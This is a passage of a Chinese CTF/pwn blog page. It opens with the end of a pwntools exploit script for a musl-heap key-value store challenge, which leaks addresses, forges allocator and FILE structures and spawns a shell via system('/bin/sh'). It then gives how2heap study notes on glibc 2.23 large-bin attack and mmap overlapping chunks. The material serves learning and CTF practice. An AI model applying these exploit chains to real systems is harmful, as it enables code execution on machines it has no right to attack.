class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="number">2021</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res = res * <span class="number">0x13377331</span> + <span class="built_in">ord</span>(content.decode()[i])</span><br><span class="line">        res %= <span class="number">0x1_0000_0000</span></span><br><span class="line">    <span class="keyword">return</span> res &amp; <span class="number">0xFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_original</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="number">2021</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res = res * <span class="number">0x13377331</span> + <span class="built_in">ord</span>(content.decode()[i])</span><br><span class="line">        res %= <span class="number">0x1_0000_0000</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size = <span class="literal">None</span>, value_size = <span class="literal">None</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(key_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;value size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(value_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;value content: &#x27;</span>, value_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;value size: &#x27;</span>, <span class="built_in">str</span>(value_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;value content: &#x27;</span>, value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size = <span class="literal">None</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(key_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">victim: <span class="built_in">bytes</span></span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    target = encrypt(victim)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> encrypt(<span class="built_in">str</span>(i).encode()) == target <span class="keyword">and</span> <span class="built_in">str</span>(i).encode() != victim:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i).encode()</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2bytes</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content) // <span class="number">2</span>):</span><br><span class="line">        res += p8(<span class="built_in">int</span>(content.decode()[i*<span class="number">2</span>], <span class="number">16</span>) * <span class="number">0x10</span> + <span class="built_in">int</span>(content.decode()[i*<span class="number">2</span>+<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">                                                    <span class="comment"># 6543210</span></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;9889&#x27;</span>)                                <span class="comment"># AAAAAAU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># AFFFFFU</span></span><br><span class="line">store(<span class="string">b&#x27;B&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                            <span class="comment"># UAAAAUU</span></span><br><span class="line">store(find_collision(<span class="string">b&#x27;B&#x27;</span>), <span class="string">b&#x27;B&#x27;</span>)                   <span class="comment"># UAAAUUU</span></span><br><span class="line">delete(<span class="string">b&#x27;B&#x27;</span>)                                        <span class="comment"># FAAAUFU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># FFFFUFU -&gt; AAAAUAU</span></span><br><span class="line">store(<span class="string">b&#x27;C&#x27;</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x1000</span>)                          <span class="comment"># AAAUUUU</span></span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">group_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>]) - <span class="number">0x70</span></span><br><span class="line">smallchunk = group_addr + <span class="number">0x30</span></span><br><span class="line">mmap_addr = u64(leak[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x20</span></span><br><span class="line">enc = u64(leak[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">1</span></span><br><span class="line">libc_base = mmap_addr + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(group_addr) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">meta_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">meta_area = meta_addr &amp; <span class="number">0xFFFF_FFFF_FFFF_F000</span></span><br><span class="line">info(<span class="string">&#x27;meta_area: &#x27;</span> + <span class="built_in">hex</span>(meta_area))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(meta_area) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">secret = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&#x27;secret: &#x27;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.symbols[<span class="string">&#x27;stdout&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">fake_file_addr = libc_base - <span class="number">0x3000</span> + <span class="number">0x560</span></span><br><span class="line">fake_meta_addr = libc_base - <span class="number">0x2000</span> + <span class="number">0x10</span></span><br><span class="line">fake_group_addr = libc_base - <span class="number">0x2000</span> + <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key</span></span><br><span class="line">key = p64(group_addr + <span class="number">0x20</span>)</span><br><span class="line">key += p64(fake_group_addr + <span class="number">0x10</span>)</span><br><span class="line">key += p64(<span class="number">4</span>)</span><br><span class="line">key += p64(<span class="number">0x30</span>)</span><br><span class="line">key += p64(encrypt_original(find_collision(find_collision(<span class="string">b&#x27;B&#x27;</span>))))</span><br><span class="line">key += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">fake_file += p64(<span class="number">1</span>)     <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system)    <span class="comment"># write</span></span><br><span class="line"></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">fake_meta = p64(fake_group_addr + <span class="number">0x10</span> + <span class="number">0x80</span>)      <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr)                            <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)                   <span class="comment"># fake_meta-&gt;mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)                                 <span class="comment"># fake_meta-&gt;avail_mask</span></span><br><span class="line">fake_meta += p64(last_idx + (freeable &lt;&lt; <span class="number">5</span>) + (sizeclass &lt;&lt; <span class="number">6</span>) + (maplen &lt;&lt; <span class="number">12</span>))</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr)</span><br><span class="line">fake_group += p64(<span class="number">1</span>)</span><br><span class="line">fake_group += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">value = fake_file.ljust(<span class="number">0x1000</span> - <span class="number">0x560</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">value += p64(secret).ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">value += fake_meta</span><br><span class="line">value += fake_group</span><br><span class="line">value += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x530</span></span><br><span class="line"></span><br><span class="line">store(key, value, key_size=<span class="number">0x30</span>, value_size=<span class="built_in">len</span>(value))</span><br><span class="line"><span class="comment"># query(p64(group_addr + 0x20) + p64(fake_group_addr + 0x90) + p64(4) + p64(0x30) +</span></span><br><span class="line"><span class="comment">#       p64(encrypt_original(find_collision(find_collision(b&#x27;B&#x27;)))) + p64(0), key_size=0x30)</span></span><br><span class="line">info(<span class="string">&#x27;fake chunk address: &#x27;</span> + <span class="built_in">hex</span>(fake_group_addr + <span class="number">0x90</span>))</span><br><span class="line">info(<span class="string">&#x27;stderr: &#x27;</span> + <span class="built_in">hex</span>(stderr))</span><br><span class="line">info(<span class="string">&#x27;group address: &#x27;</span> + <span class="built_in">hex</span>(group_addr))</span><br><span class="line">info(<span class="string">&#x27;mmap space: &#x27;</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line">delete(find_collision(find_collision(<span class="string">b&#x27;B&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-4/" class="post-title-link" itemprop="url">how2heap 深入学习(4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:27:37 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:37+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/glibc-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">glibc 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>how2heap下载网址: <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">传送门</a><br />
Glibc源码查看网址：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br />
参考书籍：CTF竞赛权威指南-pwn篇</p>
<p>测试环境：Ubuntu 16.04<br />
Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
<p>本人在前几天成功进入校队，因此后面的更新应该短时间内不会中断。<br />
按照顺序，本文分析glibc 2_23文件夹中的第12~16个源码<br />
如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p>
<h1 id="12-large_bin_attack"><a class="markdownIt-Anchor" href="#12-large_bin_attack"></a> 12. large_bin_attack</h1>
<p>large_bin_attack可以用于在栈区写入一个较大的值。通常是为其他攻击方式做准备。</p>
<p>首先，源码在栈区定义了两个变量stack_var1和stack_var2，类型为unsigned long。之后依次分配了大小为0x430(p1), 0x20, 0x510(p2), 0x20, 0x510(p3), 0x20大小的chunk。（0x20的chunk用于防止堆块合并）</p>
<p>之后，释放p1和p2。此时unsorted bin的结构应为：</p>
<p><code>unsorted bin head &lt;-&gt; p2 &lt;-&gt; p1</code></p>
<p>然后，malloc一个0xa0大小的chunk，在此过程中，p2被转移到了large bins中，p1被切割，仍在unsorted bin中且为last_remainder。</p>
<p>之后，释放p3。下面是释放p3之后的堆结构。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6030a0</span><br><span class="line">Size: 0x391</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x6039a0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603430</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x603460</span><br><span class="line">Size: 0x511</span><br><span class="line">fd: 0x7ffff7dd1fa8</span><br><span class="line">bk: 0x7ffff7dd1fa8</span><br><span class="line">fd_nextsize: 0x603460</span><br><span class="line">bk_nextsize: 0x603460</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603970</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6039a0</span><br><span class="line">Size: 0x511</span><br><span class="line">fd: 0x6030a0</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603eb0</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603ee0</span><br><span class="line">Size: 0x20121</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6039a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6039a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x500: 0x603460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x603460 /* &#x27;`4`&#x27; */</span><br></pre></td></tr></table></figure>
<p>之后是漏洞部分。如果我们可以修改p2的控制字段。那么下面如此操作：</p>
<p>将p2的size从0x511改小为0x3f1，fd和fd_nextsize改为0，bk改为<code>(unsigned long)(&amp;stack_var1-2)</code>，bk_nextsize改为<code>(unsigned long)(&amp;stack_var2-4)</code>，调试时stack_var1的地址为0x7fffffffe470，stack_var2的地址为0x7fffffffe478。那么(unsigned long)(&amp;stack_var1-2)的值就为0x7fffffffe460，(unsigned long)(&amp;stack_var2-4)的值就为0x7fffffffe458。</p>
<p>修改之后，堆结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6030a0</span><br><span class="line">Size: 0x391</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x6039a0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603430</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603460</span><br><span class="line">Size: 0x3f1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603850</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6039a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6039a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x500 [corrupted]</span><br><span class="line">FD: 0x603460 ◂— 0x0</span><br><span class="line">BK: 0x603460 —▸ 0x7fffffffe460 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>最后，malloc大小为0xa0的chunk，然后我们就会惊奇地发现两个栈变量的值被修改为p3的地址。</p>
<p>这个漏洞的利用流程就是这样，而利用的关键就是_int_malloc函数中关于large bins的处理部分。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line"></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">                 victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">             &#125;</span><br><span class="line">             bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line">   [...]</span><br><span class="line"></span><br><span class="line">   mark_bin (av, victim_index);</span><br><span class="line">   victim-&gt;bk = bck;</span><br><span class="line">   victim-&gt;fd = fwd;</span><br><span class="line">   fwd-&gt;bk = victim;</span><br><span class="line">   bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>由于在修改p2之后，bin的结构如图：</p>
<p>所以遍历时会首先遍历到p1。通过源码进行调试发现这里直接跳过了else语句而从mark_bin开始执行。victim = p1，bck = fwd = main_arena + 984，这应该是p1现在的大小所对应的应该放入的small bin的位置（此时p1大小为0x391，属于small bins范围）。经历这4步之后，p1被成功链入到一个large bin中，目前一切正常。</p>
<p>然后，_int_malloc会进行下一次循环，去处理p3。此时victim = p3，fwd = p2，bck = 0x7fffffffe460。这时，else语句中会被执行。内部4个语句执行完成后，p1，p2，p3和部分栈区结构如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">addr</th>
<th style="text-align:center">+0x0</th>
<th style="text-align:center">+0x8</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">p1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x391</td>
</tr>
<tr>
<td style="text-align:center">p1 + 0x10</td>
<td style="text-align:center">&lt;small bin addr&gt;</td>
<td style="text-align:center">&lt;small bin addr&gt;</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">p2</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x3f1</td>
</tr>
<tr>
<td style="text-align:center">p2 + 0x10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x7fffffffe460</td>
</tr>
<tr>
<td style="text-align:center">p2 + 0x20</td>
<td style="text-align:center">0</td>
<td style="text-align:center">&lt;p3&gt;（原为0x7fffffffe458，第三步修改）</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">p3</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x511</td>
</tr>
<tr>
<td style="text-align:center">p3 + 0x10</td>
<td style="text-align:center">&lt;unsorted bin head&gt;</td>
<td style="text-align:center">&lt;unsorted bin head&gt;</td>
</tr>
<tr>
<td style="text-align:center">p3 + 0x20</td>
<td style="text-align:center">&lt;p2&gt;（第一步修改）</td>
<td style="text-align:center">0x7fffffffe458（第二步修改）</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">(stack)</td>
<td style="text-align:center">stack_var1 = 0</td>
<td style="text-align:center">stack_var2 = &lt;p3&gt;（第四步修改）</td>
</tr>
</tbody>
</table>
<p>可以看到，在else语句里面，stack_var2在第4步被修改。跳出else语句之后，第四条语句<code>bck-&gt;fd = victim;</code>将stack_var1成功修改为p3的地址。至此，目标地址修改完成。stack_var1和stack_var2现在的值为p3的地址。</p>
<h1 id="13-mmap_overlapping_chunks"><a class="markdownIt-Anchor" href="#13-mmap_overlapping_chunks"></a> 13. mmap_overlapping_chunks</h1>
<p>源码中第一句就说，这是一个应该能够在所有libc版本中利用的漏洞。</p>
<p>在libc中，如果用户一次性申请的内存空间过大，malloc函数不会像通常那样从堆中分配内存给用户，而是调用mmap函数为用户映射一块单独的虚拟内存使用。同样，当用户将这块空间释放时，会调用munmap函数将这块空间返还给操作系统内核。</p>
<p>通过mmap获取的chunk在size域的bit-1上有体现。size的bit-0，bit-1，bit-2三位是用于保存控制信息的，其中bit-1就表示该chunk是否由mmap产生。mmap chunk有prev size域，它表示mmap chunk的剩余大小（内核调用mmap函数时通常会分配一块大于用户需求的内存块）。同时mmap chunk的fd和bk指针没有意义，在free时也不会放入bins中。在释放时，mmap chunk必须是页对齐的。</p>
<p>首先，程序分配一个小chunk用于初始化堆空间。然后分配一块大小为0x100000的chunk，这第一块chunk的位置是在libc的加载地址之上的，后面又分配了2个相同大小的大chunk就在libc的加载地址之下了，空间分配大致如下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">addr</th>
<th style="text-align:center">content</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">(high address)</td>
<td style="text-align:center">first mmap chunk</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">libc</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">second mmap chunk</td>
</tr>
<tr>
<td style="text-align:center">(low address)</td>
<td style="text-align:center">third mmap chunk</td>
</tr>
</tbody>
</table>
<p>此时，第三个mmap chunk的prev size为0，因为申请大小本身就是页对齐的，没有剩余空间。程序输出显示，第三个mmap chunk的size为0x101002。然后，我们只需要将这个chunk的大小改大，在释放的时候就能够将第二个mmap连带着释放掉。在程序中是将第三个chunk的size改为了0x202002，正好将第二个chunk全部覆盖。这实际上就是mmap版本的UAF。但是需要注意的是，由于munmap是将这块空间直接返还给了linux内核，因此释放后直接访问这段内存会导致程序崩溃。这点与一般的free不同。因此，现在需要做的就是将这段内存要回来，让两个指针指向相同位置。</p>
